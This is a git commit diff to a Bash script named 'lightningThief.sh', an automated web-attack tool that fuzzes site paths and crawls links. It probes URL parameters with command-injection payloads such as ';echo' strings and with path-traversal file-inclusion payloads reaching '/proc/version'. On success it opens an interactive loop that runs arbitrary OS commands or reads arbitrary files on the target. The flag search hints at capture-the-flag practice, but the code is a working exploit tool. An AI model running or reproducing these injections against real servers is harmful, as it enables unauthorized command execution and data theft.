013a38350b2302fed7a5416486ef276116a3e89f
STylerPruett <stylerpruett@yahoo.com>
2024-12-05 00:37:21 -0500

    Finally 2 Injections Done

--- lightningThief.sh
+++ lightningThief.sh
@@ -4,6 +4,8 @@ declare -A port_version_dict
 declare -A http_service_dict
 declare -A site_map_dict
 
+#set -x
+
 menu() {
     echo "Current Settings:"
     echo " "
@@ -395,6 +397,7 @@ getPortList() {
     done
 }
 
+
 enumerateSite()
 {
     cleanHTTP=()
@@ -408,15 +411,21 @@ enumerateSite()
         fi
     fi
 
+    if [[ "$httpPorts" == "LATER" ]]; then
+        read -p "Select HTTP/S Port(s): " httpPorts
+        echo " "
+    fi
+
     getPortList "$httpPorts" cleanHTTP
     echo "Starting Site Fuzzing.."
 
    if [[ "$httpPorts" == "ALL" ]]; then
         for key in "${cleanHTTP[@]}"; do
             paths="/"
-            testCurl=$(curlCall -s "$targetIP:$key/.awdad") # test to make sure it's not taking everything
-            if [[ -n $testCurl ]]; then
-                echo "All URLs are accessible, which means none truly are on port $targetIP:$key"
+            testCurl=$(curlCall -s -o /dev/null -w "%{http_code}" "$targetIP:$port/.awdad") # Check the HTTP response code
+            if [[ $testCurl -ne 404 ]]; then
+                echo $testCurl
+                echo "All URLs are accessible, which means none truly are on port $targetIP:$port"
                 continue
             fi
             output=$(gobuster -np -q -u "http://$targetIP:$key" -w "$discoveryPath")
@@ -442,7 +451,7 @@ enumerateSite()
         httpPorts=$(IFS=,; echo "${cleanHTTP[*]}")  # Rebuild as a comma-separated string
         setEnv "HTTP_PORTS" "$httpPorts"
 
-        # Perform gobuster for each port
+        # Perform curl for each port
         for port in "${cleanHTTP[@]}"; do
             paths="/"
             testCurl=$(curlCall -s -o /dev/null -w "%{http_code}" "$targetIP:$port/.awdad") # Check the HTTP response code
@@ -482,28 +491,30 @@ exploreSite()
             page="${pages[$i]}"
             #echo "Checking Page: $page"
             output=$(curlCall -s -L "$targetIP:$key$page")
-            hrefs=($(echo "$output" | sed -n 's/.*href="\([^"]*\)".*/\1/p'))
+            hrefs=($(echo "$output" | sed -n 's/.*\(href\|src\|action\)="\(\([\/?]\|\.\/\)[^"]*\)".*/\2/p')) #sed -n 's/.*href="\([^"]*\)".*/\1/p'))
             # add support for scripts later
 
             for new_page in "${hrefs[@]}"; do
                 top_level="/$(echo "$new_page" | cut -d'/' -f2)"
+                #[[ $new_page == .* ]] && new_page="${new_page:1}"
                 if [[ "$new_page" != /* && "$new_page" != .* && "new_page" != ?* && "$new_page" != "#" ]]; then
                     #echo "before: $new_page"
                     new_page="$page/$new_page"
                     #echo "after: $new_page"
                 elif [[ "$new_page" == .* || "$new_page" == "#" ]]; then
-                    continue
+                    new_page="${new_page:1}"
+                    #continue
                 fi
                 #echo "Top: $top_level"
                 #echo "Checking list for $new_page"
                 #echo "Test Page: $new_page"
-                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ ]]; then
-                    echo "$new_page"
+                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
+                    #echo "$new_page"
                     pages+=("$new_page")
                 fi
                 #echo "Test Top Page: $top_level"
-                if [[ ! " ${pages[@]} " =~ "${top_level}" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ ]]; then
-                    echo $top_level
+                if [[ ! " ${pages[@]} " =~ "${top_level}" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
+                    #echo $top_level
                     pages+=("${top_level}")
                 fi
             done
@@ -541,35 +552,157 @@ webAttack() {
     echo " "
     
     for port in "${!site_map_dict[@]}"; do
-        # File Traversal
         for url in ${site_map_dict[$port]}; do
             response=$(curlCall -s "$targetIP:$port$url")
             if [[ -n "$response" ]]; then
+                vuln="False"
                 searchFlag=$(echo "$response" | grep -oE '{[^}]*\}')
                 siteForms=$(echo "$response" | sed -n '/<form/,/<\/form>/p')
                 if [[ -n "$searchFlag" ]]; then
                     echo "Potential Flag Found: $url - $searchFlag"
                 fi
                 if [[ -n "$siteForms" ]]; then 
-                    echo "Form Found: $url - $postMe"
+                    #echo "Form Found: $url "
+                    siteGETs=$(echo "$siteForms" | sed -n "s/.*name='\([^']*\)'.*/\1/p")
+                    if [[ -n "$siteGETs" && "$url" != *"="* ]]; then
+                        url=$(echo "$url?$siteGETs=holder")
+                    fi
                 fi
                 
-                if [[ "$url" == *"="* && $rce_boolean != "True" ]]; then
-                    echo "Trying RCE Injection on $url"
-                    # RCE Injections
-                    rce_output=$(rce "$targetIP:$port$url")
-                    rce_boolean=$(echo "$rce_output" | awk '{print $1}')
-                    payload=$(echo "$rce_output" | cut -d' ' -f2-)
-                    
-                    if [[ "$rce_boolean" = "True" ]]; then
-                        echo "$targetIP:$port is vulnerable to RCE injection on page $url"
-                        # TODO: Store payload for later exploiting
-                        createPayload "$payload" "RCE"
-                    fi
+                if [[ "$url" == *"="* && $vuln != "True" ]]; then
+
+                    checkVulns "CI"
+                    [[ "$vuln" == "True" ]] && break
+                    checkVulns "LFI"
+                    [[ "$vuln" == "True" ]] && break
+
+
                 fi
             fi
         done
     done
+}
+
+lfi()
+{
+    #set -x
+    root=$(echo "$1" | cut -d'=' -f1)
+    searchFile="/proc/version"
+    searchWord="version"
+    lfi_injections=(
+    "$searchFile"
+    "../../../../../..$searchFile")
+
+    for injection in "${lfi_injections[@]}"; do
+        encoded_injection=$(urlencode "$injection")
+        output=$(curlCall -s "${root}=${encoded_injection}")
+        if [[ -n "$output" ]]; then
+            check=$(echo "$output" | grep "$searchWord" | grep -v "proc")
+            if [[ -n "$check" ]]; then
+                # Return "True" and the payload
+                echo "True ${root}=${injection}"
+                break
+            fi
+        fi
+    done
+}
+
+
+ci() {
+    #set -x # Debug
+    root=$(echo "$1" | cut -d'=' -f1)
+    searchWord="The Lightning Thief Strikes Again"
+    ci_injections=(
+    "echo \"$searchWord\"" 
+    "\";echo \"$searchWord\"\""
+    "';echo \"$searchWord\"'")
+    # Define the injection string
+    #injection="\";echo \"$searchWord\"\""
+    for injection in "${ci_injections[@]}"; do
+        encoded_injection=$(urlencode "$injection")
+
+        # Make the curl request
+        output=$(curlCall -s "${root}=${encoded_injection}")
+
+        # Check if the output contains the search word
+        if [[ -n "$output" ]]; then
+            check=$(echo "$output" | grep "$searchWord" | grep -v "echo")
+            if [[ -n "$check" ]]; then
+                # Return "True" and the payload
+                echo "True ${root}=${injection}"
+                break
+            fi
+        fi
+    done
+}
+
+checkVulns()
+{
+    if [[ "$1" = "CI" ]]; then
+        echo "Trying Command Injection (CI) on $url"
+        # Command Injections (CI)
+        vuln_output=$(ci "$targetIP:$port$url")
+    elif [[ "$1" = "LFI" ]]; then
+        vuln_output=$(lfi "$targetIP:$port$url")
+        echo "Trying Local File Inclusion (LFI) on $url"
+    fi
+    
+    vuln_boolean=$(echo "$vuln_output" | awk '{print $1}')
+    payload=$(echo "$vuln_output" | cut -d' ' -f2-)
+
+    if [[ "$vuln_boolean" = "True" ]]; then
+        echo " "
+        echo "$targetIP:$port is vulnerable to $1 on page $url"
+        vuln="True"
+        createPayload "$payload" "$1"
+    fi
+}
+
+createPayload()
+{
+    echo " "
+    echo "Payload: $1"
+    echo " "
+    read -p "Would you like to attempt an exploit at this time? (y/n): " payload_response
+    echo " "
+    if [[ "$payload_response" = "y" ]]; then
+        if [[ "$2" = "CI" ]]; then
+            echo "Starting CI Injection - Input should be an OS Command"
+            temp_command=$(urlencode 'echo [YOUR_INPUT_APPEARS_HERE]')
+            temp_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$temp_command/")
+            temp_output=$(curlCall -s "$temp_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
+        elif [[ "$2" = "LFI" ]]; then
+            echo "Starting LFI Injection - Input should be a File Path"
+            temp_command=$(echo "$1")
+            temp_payload=$(echo "$temp_command")
+            temp_output=$(curlCall -s "$temp_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
+        fi
+
+        echo " "
+        echo "$temp_output"
+        echo " "
+
+        while true; do
+            read -p "Input Injection (type 'quit' to exit): " payload_command
+            if [[ $payload_command = "quit" ]]; then
+                break
+            else
+                if [[ "$2" = "CI" ]]; then
+                    new_command=$(urlencode "$payload_command | xargs")
+                    new_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$new_command/")
+                    exploit_output=$(curlCall -s "$new_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
+                elif [[ "$2" = "LFI" ]]; then
+                    new_command=$(urlencode "$payload_command")
+                    new_payload=$(echo "$1" | sed "s|/proc/version|$new_command|")
+                    exploit_output=$(curlCall -s "$new_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
+                fi
+                echo "$exploit_output"
+                echo " "
+            fi
+        done
+    fi
+    # TODO: Store payloads for later exploiting
+
 }
 
 urlencode() {
@@ -584,39 +717,6 @@ urlencode() {
         esac
     done
     echo "$encoded"
-}
-
-travelFiles()
-{
-    baseURL=$1
-
-}
-
-rce() {
-    #$set -x # Debug
-    root=$(echo "$1" | cut -d'=' -f1)
-    searchWord="The Lightning Thief Strikes Again"
-    rce_injections=(
-    "\";echo \"$searchWord\"\""
-    "';echo \"$searchWord\"'")
-    # Define the injection string
-    #injection="\";echo \"$searchWord\"\""
-    for injection in "${rce_injections[@]}"; do
-        encoded_injection=$(urlencode "$injection")
-
-        # Make the curl request
-        output=$(curlCall -s "${root}=${encoded_injection}" )
-
-        # Check if the output contains the search word
-        if [[ -n "$output" ]]; then
-            check=$(echo "$output" | grep "$searchWord" | grep -v "echo")
-            if [[ -n "$check" ]]; then
-                # Return "True" and the payload
-                echo "True ${root}=${injection}"
-                break
-            fi
-        fi
-    done
 }
 
 curlCall()
@@ -636,36 +736,6 @@ curlCall()
     done
     if [[ $retry_count -eq $max_retries ]]; then
     echo "Failed to get a successful response after $max_retries retries."
-    fi
-
-}
-
-createPayload()
-{
-    echo " "
-    echo "Payload: $1"
-    echo " "
-    read -p "Would you like to attempt an exploit at this time? (y/n): " payload_response
-    if [[ "$payload_response" = "y" ]]; then
-        if [[ "$2" = "RCE" ]]; then
-            temp_command=$(urlencode 'echo [YOUR_INPUT_APPEARS_HERE]')
-            temp_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$temp_command/")
-            temp_output=$(curlCall -s "$temp_payload" | sed -n 's/<[^>]*>//gp' | sed '/^[[:space:]]*$/d')
-            echo "$temp_output"
-            echo " "
-
-            while true; do
-                read -p "Enter Command (type 'quit' to exit): " payload_command
-                if [[ $payload_command = "quit" ]]; then
-                    break
-                else
-                    new_command=$(urlencode "$payload_command | xargs")
-                    new_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$new_command/")
-                    exploit_output=$(curlCall -s "$new_payload" | sed -n 's/<[^>]*>//gp' | sed '/^[[:space:]]*$/d')
-                    echo "$exploit_output"
-                fi
-            done
-        fi
     fi
 
 }
